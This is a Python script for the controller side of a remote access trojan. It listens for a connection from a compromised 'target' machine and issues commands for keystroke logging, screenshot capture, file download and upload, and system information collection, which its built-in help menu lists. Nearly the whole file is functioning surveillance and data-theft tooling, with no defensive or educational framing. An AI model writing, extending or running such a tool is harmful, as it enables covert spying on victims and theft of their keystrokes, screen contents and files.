# Remote Shell

# Description:
# This script establishes a remote shell connection with a target machine, allowing the execution
# of various commands and file operations.

import socket
import os
import json
import time
from datetime import datetime


class Server:
    def __init__(self, l_host, l_port):
        self.l_host = l_host
        self.l_port = l_port
        self.base_filename = None
        self.log_filename = None
        self.screenshot_filename = None
        self.dump_logging = ""
        self.server_socket = None
        self.target_socket = None
        self.active_once = True

    def dump_log_file(self):
        count = 1
        while os.path.exists(self.log_filename):
            # If it exists, increment the count and update the filename
            count += 1
            self.log_filename = f'{self.base_filename} ({count}).txt'

        with open(self.log_filename, "a") as log:
            log.write(self.dump_logging)

    def key_logger(self):
        self.dump_logging = ""
        while True:
            try:
                R_OUTPUT = self.target_socket.recv(1024).decode()
                print(R_OUTPUT, end='')
                self.dump_logging += R_OUTPUT
            except KeyboardInterrupt:
                self.dump_log_file()
                break

    def send_data_as_json(self, data):
        json_data = json.dumps(data)
        self.target_socket.send(json_data.encode())

    def receive_data_as_json(self):
        received_data = ''
        while True:
            try:
                received_data += self.target_socket.recv(1024).decode().rstrip()
                return json.loads(received_data)
            except json.JSONDecodeError:
                continue

    def upload_file(self, file_name):
        try:
            with open(file_name, 'rb') as up_file:
                self.target_socket.send(up_file.read())
        except Exception as e_upload_file:
            print(f"Error uploading file: {e_upload_file}")

    def download_file(self, file_name):
        try:
            with open(file_name, 'wb') as down_file:
                self.target_socket.settimeout(1)
                while True:
                    chunk = self.target_socket.recv(1024)
                    if not chunk:
                        break
                    down_file.write(chunk)
        except socket.timeout:
            pass
        except Exception as e_download_file:
            print(f"Error downloading file: {e_download_file}")
        finally:
            self.target_socket.settimeout(None)

    def screen_shot(self):
        # Check if the file with the base name already exists
        count = 1
        while os.path.exists(self.screenshot_filename):
            # If it exists, increment the count and update the filename
            count += 1
            self.screenshot_filename = f'{self.base_filename} ({count}).png'

        try:
            with open(self.screenshot_filename, 'ab') as screen_shot:
                while True:
                    # Receive the image chunk
                    image_chunk = self.target_socket.recv(1024)

                    # Check if the received chunk is the last part of the image
                    if b"END_OF_IMAGE" in image_chunk:
                        screen_shot.write(image_chunk[:-len(b"END_OF_IMAGE")])
                        break
                    else:
                        screen_shot.write(image_chunk)

        except Exception as e_screenshot:
            print(f"Screenshot error: {e_screenshot}")

    def target_sys_info(self):
        target_sys = self.receive_data_as_json()
        print(target_sys)

    def main(self):
        self.base_filename = datetime.now().strftime("%d-%m-%Y_%H-%M")
        self.log_filename = f'{self.base_filename}.txt'
        self.screenshot_filename = f'{self.base_filename}.png'

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.l_host, self.l_port))
        print("[•] Listening for incoming connections")
        self.server_socket.listen(5)

        # Accept a connection from the target
        self.target_socket, r_host = self.server_socket.accept()
        print("[+] connected to: " + str(r_host))
        print("\n[*] Type: info\n")
        while True:
            command = input("[$] shell~# ")
            if command == '':
                continue

            elif command.lower() == 'info':
                print("""

                    [*] Shell commands:


                    • keyscan_start - Start the keylogger.

                    • keyscan_stop - Stop the keylogger and save the log to a file in the script's directory.
                    
                    • screenshot - Take a screenshot and save the img in the script's directory.

                    • download <file_name> - Download a file from the target.

                    • upload <file_name> - Upload a file to the target.

                    • target info - Get target detailed info.

                    • clear or cls - Clear the screen.


                    • quit - Quit the shell and close the connection.


                    Note: Replace <file_name> with the name of the file you want to download or upload.

                    """)
                continue

            elif command.startswith('keyscan_stop'):  # just to be safe
                continue

            self.send_data_as_json(command)

            if command.lower() == 'quit':
                self.dump_log_file()
                self.target_socket.close()
                exit(0)

            elif command.startswith('cd '):
                continue

            elif command in ['clear', 'cls']:
                clear_command = 'clear' if command == 'clear' else 'cls'
                os.system(clear_command)
                continue

            elif command.startswith('keyscan start'):
                print("[+] Keylogger started.")
                print("[!] ctrl+C to save & stop")
                self.key_logger()
                print("[!] Log saved! ")
                time.sleep(1.25)
                self.send_data_as_json('keyscan_stop')
                continue

            elif command.startswith('download'):
                self.download_file(command[9:])
                continue
            elif command.startswith('upload'):
                self.upload_file(command[7:])
                continue

            elif command.startswith('screenshot'):
                self.screen_shot()
                continue

            elif command.startswith('target info'):
                self.target_sys_info()
                continue

            else:
                result = self.receive_data_as_json()
                print(result)


if __name__ == "__main__":
    server = Server('192.168.0.0', 5555)  # enter ip and port
    server.main()
